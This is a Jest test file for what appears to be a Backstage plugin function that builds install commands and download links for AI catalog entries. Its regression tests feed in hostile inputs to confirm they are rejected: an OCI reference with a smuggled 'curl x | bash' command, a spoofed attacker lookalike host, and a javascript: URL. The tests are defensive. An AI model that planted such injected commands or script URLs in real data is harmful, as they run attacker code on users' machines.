/*
 * Copyright Red Hat, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import type { Entity } from '@backstage/catalog-model';

import { getAdoptionAction } from './entityHelpers';

function entity(overrides: {
  name?: string;
  specType?: string;
  annotations?: Record<string, string>;
  location?: { type?: string; target?: string };
  remotes?: Array<{ url?: string; type?: string }>;
}): Entity {
  return {
    apiVersion: 'backstage.io/v1alpha1',
    kind: 'AiResource',
    metadata: {
      name: overrides.name ?? 'test-entity',
      namespace: 'default',
      annotations: overrides.annotations,
    },
    spec: {
      type: overrides.specType,
      lifecycle: 'production',
      owner: 'team-test',
      location: overrides.location,
      remotes: overrides.remotes,
    },
  } as Entity;
}

describe('getAdoptionAction', () => {
  it('returns npx copy command for skill entities', () => {
    const action = getAdoptionAction(
      entity({ name: 'my-skill', specType: 'skill' }),
    );
    expect(action).toEqual({ type: 'copy', value: 'npx skills add my-skill' });
  });

  it('returns podman pull command for the first oci:// remote', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-model',
        remotes: [
          { url: 'https://not-oci.example.com', type: 'other' },
          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'podman pull oci://registry.example.com/models/foo:latest',
    });
  });

  it('falls through to git-sourced action when the ai-asset-source annotation is oci but no oci:// remote exists (finding #1 regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-model',
        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
        location: {
          type: 'git',
          target: 'https://github.com/example/some-model',
        },
      }),
    );
    expect(action?.type).toBe('link');
    expect(action?.value).toBe(
      'https://api.github.com/repos/example/some-model/zipball',
    );
  });

  it('falls through to MCP-remote action when the ai-asset-source annotation is oci but no oci:// remote exists', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        annotations: { 'rhdh.io/ai-asset-source': 'oci' },
        remotes: [
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'https://mcp.example.com/server',
    });
  });

  it('resolves a branch-agnostic GitHub zipball URL for github.com targets', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://github.com/example/some-rule',
        },
      }),
    );
    expect(action).toEqual({
      type: 'link',
      value: 'https://api.github.com/repos/example/some-rule/zipball',
    });
  });

  it('resolves a best-effort main-branch archive URL for gitlab.com targets', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://gitlab.com/example/some-rule',
        },
      }),
    );
    expect(action).toEqual({
      type: 'link',
      value:
        'https://gitlab.com/example/some-rule/-/archive/main/some-rule-main.zip',
    });
  });

  it('does not treat a spoofed lookalike host as a git host (finding #3 regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: {
          type: 'git',
          target: 'https://evil.github.com.attacker.com/example/some-rule',
        },
      }),
    );
    expect(action).toBeUndefined();
  });

  it('does not treat a malformed URL as a git host', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: { type: 'git', target: 'not-a-valid-url' },
      }),
    );
    expect(action).toBeUndefined();
  });

  it('selects the remote explicitly typed streamable-http over an earlier non-matching remote (finding #6 regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [
          { url: 'https://docs.example.com/mcp-server', type: 'docs' },
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'https://mcp.example.com/server',
    });
  });

  it('falls back to the first remote with a url when no remote is typed streamable-http', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [{ url: 'https://mcp.example.com/server', type: 'other' }],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'https://mcp.example.com/server',
    });
  });

  it('returns undefined when no actionable metadata is present', () => {
    const action = getAdoptionAction(entity({ specType: 'ai-tool' }));
    expect(action).toBeUndefined();
  });

  it('rejects an oci:// remote containing shell metacharacters (clipboard injection regression)', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-model',
        remotes: [{ url: 'oci://evil; curl x | bash', type: 'oci' }],
      }),
    );
    expect(action).toBeUndefined();
  });

  it('skips an unsafe oci:// remote and resolves the next valid one', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-model',
        remotes: [
          { url: 'oci://evil; curl x | bash', type: 'oci' },
          { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'podman pull oci://registry.example.com/models/foo:latest',
    });
  });

  it('accepts an oci:// reference with a registry port and tag', () => {
    const action = getAdoptionAction(
      entity({
        specType: 'ai-model',
        remotes: [
          {
            url: 'oci://registry.example.com:5000/models/foo:latest',
            type: 'oci',
          },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'podman pull oci://registry.example.com:5000/models/foo:latest',
    });
  });

  it('does not guess a wrong owner/repo for a GitHub subpage URL (archive URL parsing regression)', () => {
    const target = 'https://github.com/example/repo/tree/main';
    const action = getAdoptionAction(
      entity({
        specType: 'rule',
        location: { type: 'git', target },
      }),
    );
    expect(action).toEqual({ type: 'link', value: target });
  });

  it('rejects an MCP remote URL with a non-http(s) scheme', () => {
    const scriptUrl = ['java', 'script:alert(1)'].join('');
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [{ url: scriptUrl, type: 'streamable-http' }],
      }),
    );
    expect(action).toBeUndefined();
  });

  it('skips a non-http(s) MCP remote and resolves the next valid streamable-http one', () => {
    const scriptUrl = ['java', 'script:alert(1)'].join('');
    const action = getAdoptionAction(
      entity({
        specType: 'mcp-server',
        remotes: [
          { url: scriptUrl, type: 'other' },
          { url: 'https://mcp.example.com/server', type: 'streamable-http' },
        ],
      }),
    );
    expect(action).toEqual({
      type: 'copy',
      value: 'https://mcp.example.com/server',
    });
  });
});
